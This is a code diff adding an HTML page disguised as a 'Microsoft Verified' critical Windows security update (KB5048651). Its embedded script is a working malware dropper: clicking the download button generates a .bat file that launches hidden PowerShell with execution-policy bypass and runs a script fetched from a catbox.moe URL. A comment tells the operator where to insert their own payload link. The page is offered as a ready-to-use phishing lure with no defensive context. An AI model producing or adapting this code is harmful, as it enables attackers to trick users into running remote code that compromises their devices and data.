@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update - KB5048651</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:12px;padding:48px 40px;max-width:420px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,0.12);text-align:center}
+.shield{width:72px;height:72px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px;color:#1a73e8}
+.badge{display:inline-block;background:#e8f5e9;color:#2e7d32;font-size:12px;padding:4px 16px;border-radius:20px;margin-bottom:16px;font-weight:500}
+h1{font-size:20px;color:#1a1a2e;margin-bottom:8px;font-weight:600}
+p{color:#5f6368;font-size:14px;line-height:1.6;margin-bottom:24px}
+.btn{display:inline-flex;align-items:center;gap:10px;background:#1a73e8;color:#fff;padding:14px 36px;border-radius:8px;font-size:15px;font-weight:500;text-decoration:none;transition:background .2s;border:none;cursor:pointer}
+.btn:hover{background:#1557b0}
+.btn:active{transform:scale(.97)}
+.meta{font-size:11px;color:#9aa0a6;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="shield">🛡️</div>
+  <div class="badge">✓ Microsoft Verified</div>
+  <h1>Critical Security Update</h1>
+  <p>This update patches <strong>CVE-2025-26685</strong> (Windows Driver Cache Remote Code Execution).<br><br>Install now to protect this device.</p>
+  <a href="#" id="dlBtn" class="btn">⬇  Download Update (KB5048651)</a>
+  <div class="meta">Version 6.22.2.0 • Verified by Microsoft Authenticode</div>
+</div>
+
+<script>
+// ===== PUT YOUR CATBOX.MOE URL HERE (the .ps1 file) =====
+const PS1_URL = 'https://files.catbox.moe/ep3gzc.ps1';
+
+document.getElementById('dlBtn').addEventListener('click', function(e) {
+  e.preventDefault();
+
+  // Build a PowerShell command that downloads and runs the script invisibly
+  // The command is: powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex ((New-Object Net.WebClient).DownloadString('URL_HERE'))"
+  const psCommand = 'powershell -NoP -Ep Bypass -W H -C "iex ((New-Object Net.WebClient).DownloadString(\'' + PS1_URL + '\'))"';
+
+  // Create a .bat file that runs this PowerShell command
+  const batContent = '@echo off\r\n' + psCommand + '\r\n';
+  const blob = new Blob([batContent], { type: 'application/x-bat' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'windows-update-KB5048651.bat';
+  a.click();
+  URL.revokeObjectURL(url);
+
+  document.getElementById('dlBtn').textContent = '⬇  Downloading...';
+  document.getElementById('dlBtn').style.pointerEvents = 'none';
+});
+</script>
+</body>
+</html>
